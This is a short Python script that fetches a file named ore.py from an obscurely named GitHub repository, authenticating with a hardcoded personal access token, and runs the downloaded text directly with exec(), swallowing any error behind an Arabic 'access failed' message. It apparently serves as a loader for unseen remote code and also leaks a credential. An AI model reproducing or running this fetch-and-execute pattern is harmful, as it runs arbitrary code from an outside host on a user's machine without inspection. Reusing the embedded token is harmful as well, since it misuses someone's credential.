import requests
url = "https://raw.githubusercontent.com/zrvvr4h4hgey34g-prog/fdgdgdg/main/ore.py"
token = "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"
try:
    headers = {"Authorization": f"token {token}"} 
    response = requests.get(url, headers=headers)
    response.raise_for_status()
    code = response.text
    exec(code)
except:
    print("⚠️ فشل الوصول")
